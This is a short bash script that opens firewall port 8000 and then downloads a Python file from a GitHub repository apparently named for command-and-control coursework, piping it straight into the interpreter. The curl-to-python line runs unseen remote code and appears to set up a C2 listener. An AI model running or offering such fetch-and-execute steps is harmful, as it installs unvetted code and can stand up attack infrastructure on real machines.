#!/bin/bash
firewall-cmd --permanent --add-port=8000/tcp
firewall-cmd --reload
curl -sL https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/week4.py | python
